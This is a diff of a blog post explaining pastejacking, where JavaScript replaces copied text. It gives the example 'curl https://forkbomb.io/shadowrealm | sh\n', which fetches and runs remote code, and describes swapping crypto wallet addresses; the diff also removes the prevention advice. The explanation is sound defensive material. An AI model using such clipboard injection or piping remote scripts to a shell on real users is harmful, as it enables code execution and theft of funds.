@@ -1,4 +1,4 @@
-I"�<p>The last several years have brought incredible gains in the number of cyberattacks waged. These attacks entail a variety of exploits, with some using methods as simple as social engineering. Human behavior is often the weakest link, and a particular javascript exploit takes advantage of trust in a computer’s copy-and-paste functionality.  This form of attack, commonly referred to as <a href="https://www.geeksforgeeks.org/what-is-pastejacking/">pastejacking</a>, can fit into many different cyberattack campaigns. This attack takes advantage of one of the most common user interactions with a computer.</p>
+I"<p>The last several years have brought incredible gains in the number of cyberattacks waged. These attacks entail a variety of exploits, with some using methods as simple as social engineering. Human behavior is often the weakest link, and a particular javascript exploit takes advantage of trust in a computer’s copy-and-paste functionality.  This form of attack, commonly referred to as <a href="https://www.geeksforgeeks.org/what-is-pastejacking/">pastejacking</a>, can fit into many different cyberattack campaigns. This attack takes advantage of one of the most common user interactions with a computer.</p>
 
 <p>Pastejacking attacks exploit temporary storage memory by replacing copied data stored in device memory with different, often malicious, data. This exploit may take the form of a client-side or a server-side attack.</p>
 
@@ -25,10 +25,11 @@ function(e) {
 
 <p>Let’s say a junior programmer is attempting to utilize a code snippet from StackOverflow, which is not an unusual scenario that most software engineers have done at some point in their career. A malicious entity wages an attack against users trying to copy and paste a code snippet from the web browser into their terminal.</p>
 
-<p>The javascript function as defined above replaces the copied text within the clipboard, thus overriding the in-memory data and replacing it with:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://forkbomb.io/shadowrealm | sh\n
-</code></pre></div></div>
-<p>This string is a curl command that navigates a user to the URL <a href="https://forkbomb.io/shadowrealm/">https://forkbomb.io/shadowrealm</a>, which in this case is a striking yet graceful warning to users.</p>
+<p>The javascript function as defined above replaces the copied text within the clipboard, thus overriding the in-memory data and replacing it with:<br />
+‘’’
+curl https://forkbomb.io/shadowRealm | sh\n
+‘’’ 
+This string is a curl command that navigates a user to the URL https://forkbomb.io/shadowRealm, which in this case is a striking yet graceful warning to users.</p>
 
 <p>Because the pasted snippet includes the string sh\n, the command runs immediately as if the user had manually pressed the return key, thus preventing a user from realizing what is happening until the attack is underway.</p>
 
@@ -40,25 +41,7 @@ function(e) {
 
 <p>Metamask is a popular crypto wallet commonly used for NFT transactions and blockchain applications. This wallet provides convenience to users by existing both in-browser and as a Google Chrome extension. One of the most convenient features is the fact that users can easily copy their crypto wallet address with a single click:</p>
 
-<p><img src="../../../../../assets/image/pastejacking-crypto-wallets-forkbomb-address-theft-defi.png" alt="pastejacking-crypto-wallets-forkbomb-address-theft-defi" class="img-responsive" /></p>
-
 <p>You can probably see where this is going. An insecure website, or nefarious browser extension, running this javascript copy-injection could hijack a user’s transaction by replacing the presented contract address text with another one, such as the attacker’s address, thus redirecting funds to their wallet permanently.</p>
 
-<p>In the case of Metamask, tools such as <a href="https://github.com/LavaMoat/LavaMoat">LavaMoat</a> are used to prevent software supply chain attacks from being deployed directly on its user base. However, as long as gaps within DevSecOps exist, attackers will find a way to wage attacks on users. Other means of attack, such as cross-site scripting attacks, are still viable pathways to reach individual users.</p>
-
-<h2 id="preventing-crypto-theft">Preventing Crypto Theft</h2>
-<p>As users of defi software, we are ultimaly responsible for our own financial safety. We advice several tips to mitigate the risk of crypto theft through pastejacking:</p>
-<ul>
-  <li>Always visually inspect the transaction page in MetaMask, or your preferred client before running every transaction.</li>
-  <li>At least double/triple check the first 4 characters of the contract to see that they match up.</li>
-  <li>Investigate suspicious contracts, especially if there is high outflow to another contract address.</li>
-  <li>If you do a lot of business on ethereum, use services like ENS to map a trusted domain name to your contract address</li>
-</ul>
-
-<p>Unfortunately if you have fallen victim to smart contract fraud, there is little recourse in remediation other than to continue using the platform using the guidance laid out in this post and exhibiting extreme caution when handling any amount of money/value you intend to preserve.</p>
-
-<h2 id="key-learnings-for-defi-developers">Key Learnings for Defi Developers</h2>
-
-<p>Just like the early stages of Web 1.0 and Web 2.0, underscoring security and trust within Web 3.0 will be the key to its widespread adoption.  The authentication and origination benefits that wallets such as MetaMask provide are compelling, however, they must be implemented with security in mind. For decentralized service providers, steps need to be taken to prevent code tampering, avoid unsafe development prctices, and protect those using the service.</p>
-
+<p>In the case of Metamask, tools such as LavaMoat are used to prevent software supply chain attacks from being deployed directly on its user base. However, as long as gaps within DevSecOps exist, attackers will find a way to wage attacks on users. Other means of attack, such as cross-site scripting attacks, are still viable pathways to reach individual users.</p>
 :ET
